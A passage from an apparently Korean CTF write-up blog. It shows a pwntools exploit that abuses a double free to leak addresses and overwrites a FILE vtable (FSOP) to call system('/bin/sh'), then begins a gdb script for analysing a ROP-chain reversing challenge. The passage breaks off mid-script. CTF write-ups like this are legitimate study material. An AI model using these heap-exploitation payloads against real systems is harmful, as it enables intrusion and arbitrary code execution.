</span></span><span style="display:flex;"><span><span style="color:#a6e22e">create_AES_object</span>(<span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xa0&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xe8&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">encrypt</span>(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recv</span>(<span style="color:#ae81ff">0x20</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rv</span>[<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x00DBE8</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">heap</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rv</span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">heap</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">bin_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0E030</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xa0&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00DBE8</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xa0&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">encrypt</span>(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recv</span>(<span style="color:#ae81ff">0x20</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rv</span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">24</span>]) <span style="color:#f92672">-</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">_IO_2_1_stdout_</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">libc_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">vtable</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1e9260</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc_base</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload_start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">heap</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x29b0</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x00000000fbad2084</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">_IO_2_1_stdin_</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0xffffffffffffffff</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">heap</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">lock</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0xffffffffffffffff</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>) 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">heap</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">vtable</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">payload_start</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">payload</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>[<span style="color:#e6db74">&#34;system&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span><span style="color:#f92672">+</span> <span style="color:#a6e22e">next</span>(<span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">search</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">payload</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stdcpp_target</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1ded60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20d000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x200</span>,<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">stdcpp_target</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">stdcpp_target</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">stdcpp_target</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">target</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0E030</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0xdeadbeef</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0E030</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">payload_start</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">payload_start</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0E030</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">payload_start</span>))
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0E030</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)) 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>     <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\x30&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>     <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\x30&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">create_AES_object</span>(<span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0DBE8</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">changed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">heap</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recv</span>(<span style="color:#ae81ff">0x20</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">interactive</span>()
</span></span></code></pre></div><p>double free를 이용해서 AES_object + 0x0에 위치한 vtable을 dummy vtable로 수정하고 encrypt를 호출해 plain text를 노출시켜서 메모리 릭을 할 수 있다.
이후 stdout을 릭하고 이를 덮어서 FSOP를 했다.</p>
<h1 id="lor---diablo-pwn--lor---mechagolem-rev">Lor - Diablo (pwn) &amp; LoR - mechagolem (rev)<a hidden class="anchor" aria-hidden="true" href="#lor---diablo-pwn--lor---mechagolem-rev">#</a></h1>
<h2 id="analysis-3">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-3">#</a></h2>
<p><img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/ida_decomp.png" alt=""  />

리버싱 겸 포너블이였다.
먼저 디스어셈블러를 짜고 편의기능을 추가해서 분석을 시도했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">gdb</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">struct</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">inf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gdb</span>.<span style="color:#a6e22e">selected_inferior</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34785000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">end</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a2d0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">inf</span>.<span style="color:#a6e22e">read_memory</span>(<span style="color:#a6e22e">start</span>,<span style="color:#a6e22e">end</span><span style="color:#f92672">-</span><span style="color:#a6e22e">start</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chains</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(((<span style="color:#a6e22e">end</span><span style="color:#f92672">-</span><span style="color:#a6e22e">start</span>)<span style="color:#75715e">//8)):
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">chains</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">struct</span>.<span style="color:#a6e22e">unpack</span>(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>, <span style="color:#a6e22e">tmp</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;chains ready&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">var_564edd86b078</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">length</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gads</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">chains</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ele</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chains</span>[<span style="color:#a6e22e">i</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;r-x&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">gdb</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;xinfo {ele}&#39;</span>,<span style="color:#a6e22e">to_string</span><span style="color:#f92672">=</span><span style="color:#a6e22e">True</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gdb</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;x/20xi {ele}&#39;</span>,<span style="color:#a6e22e">to_string</span><span style="color:#f92672">=</span><span style="color:#a6e22e">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ele</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">gads</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">gads</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">ele</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">lines</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">line</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">lines</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pass</span>
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\t&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ret&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">line</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">ele</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gads_</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">gads</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gdb</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;x/20xi {i}&#39;</span>,<span style="color:#a6e22e">to_string</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lines</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gads_</span>.<span style="color:#a6e22e">append</span>([])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">line</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">lines</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">gads_</span>[<span style="color:#a6e22e">c</span>].<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\t&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ret&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">line</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">c</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">gads_</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>     <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: gads_[{c}] : &#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;;&#39;</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">i</span>))
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>     <span style="color:#a6e22e">c</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rcx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r8</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">eflags</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">const_1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000055765999c000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">variables</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12078</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;usr_input_len_{hex(bin_base+0x12078)[2:]}&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12068</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;iterator_{hex(bin_base + 0x12068)[2:]}&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12060</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;tmp_{hex(bin_base+0x12060)[2:]}&#39;</span>
